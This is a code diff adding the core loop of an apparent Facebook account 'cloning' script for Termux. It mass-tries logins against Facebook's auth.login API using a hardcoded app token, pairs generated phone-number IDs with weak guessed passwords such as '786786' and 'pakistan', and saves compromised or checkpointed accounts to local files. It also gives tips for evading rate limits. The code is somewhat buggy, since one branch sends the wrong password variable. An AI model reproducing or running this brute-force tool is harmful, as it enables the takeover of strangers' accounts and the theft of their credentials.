@@ -132,4 +132,110 @@ def action():
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
+
+elif ss == '0':
+        exb()
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    os.system('clear')
+    print logo
+    jalan ('\x1b[1;97mUse without internet sim.minimize termux and check every 10 minutes  later. airplane mode use every 10 mint.')
+    print(47*'-')
+    xxx = str(len(id))
+    jalan('\x1b[1;97m              TOTAL IDS :\x1b[1;96m ' + xxx)
+    print(47*'-')
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;96m  [RAJPOOT_Temp_Lock]  ' + k + c + user + '  |  ' + pass1
+                okb = open('save/CP.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;97m  [RAJPOOT_CP] ' + k + c + user + '  |  ' + pass1
+                cps = open('save/CP.txt', 'a')
+                cps.write(k + c + user + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+            else:
+                pass2 = k + c + user
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;96m  [RAJPOOT_Temp_Lock] ' + k + c + user + '  |  ' + pass2
+                    okb = open('save/OK.txt', 'a')
+                    okb.write(k + c + user + pass2 + '\n')
+                    okb.close()
+                    oks.append(c + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;97m  [RAJPOOT_CP] ' + k + c + user + '  |  ' + pass2
+                    cps = open('save/CP.txt', 'a')
+                    cps.write(k + c + user + pass2 + '\n')
+                    cps.close()
+                    cpb.append(c + user + pass2)
+                else:
+                    pass3 = '786786'
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;96m  [RAJPOOT_Temp_Lock]  ' + k + c + user + '  |  ' + pass3
+                        okb = open('save/CP.txt', 'a')
+                        okb.write(k + c + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;97m  [RAJPOOT_CP] ' + k + c + user + '  |  ' + pass3
+                        cps = open('save/CP.txt', 'a')
+                        cps.write(k + c + user + pass3 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass3)
+                    else:
+                       pass4 = 'pakistan'
+                       data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                       q = json.load(data)
+                       if 'access_token' in q:
+                        print '\x1b[1;96m  [RAJPOOT_Temp_Lock]  ' + k + c + user + '  |  ' + pass4
+                        okb = open('save/CP.txt', 'a')
+                        okb.write(k + c + user + pass4 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                       elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;97m  [RAJPOOT_CP] ' + k + c + user + '  |  ' + pass4
+                        cps = open('save/CP.txt', 'a')
+                        cps.write(k + c + user + pass4 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass4)
+                        
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print(48*"-")
+    print 'Process Has Been Completed ...'
+    print 'Total OK : ' + str(len(oks))
+    print 'Total CP : ' + str(len(cpb))
+    print(47*"-")
+    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
+    jalan('Note : Cp account  10 say 12 days BAD OPEN KRY')
+    raw_input('\n\x1b[1;97m[\x1b[1;98melite_menu_Back\x1b[1;95m]')
+    login()
+
+
+if __name__ == '__main__':
+    menu()
+
+
+
       
